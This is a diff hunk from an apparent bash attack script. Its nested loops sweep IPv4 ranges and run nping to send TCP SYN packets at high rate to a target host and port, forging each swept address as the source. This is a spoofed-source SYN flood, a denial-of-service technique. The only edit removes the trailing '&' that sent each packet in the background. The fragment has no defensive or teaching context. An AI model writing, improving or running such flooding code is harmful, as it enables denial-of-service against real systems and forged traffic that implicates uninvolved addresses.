@@ -37,7 +37,7 @@ else
       for j in $i.{0..255}; do
         for k in $i.$j.{0..255}; do
           for l in $i.$j.$k.{0..255}; do
-            nping -c 1 --rate 90000 --tcp --flags SYN -S $i.$j.$k.$l -g $2 $1 &
+            nping -c 1 --rate 90000 --tcp --flags SYN -S $i.$j.$k.$l -g $2 $1
           done
         done
       done
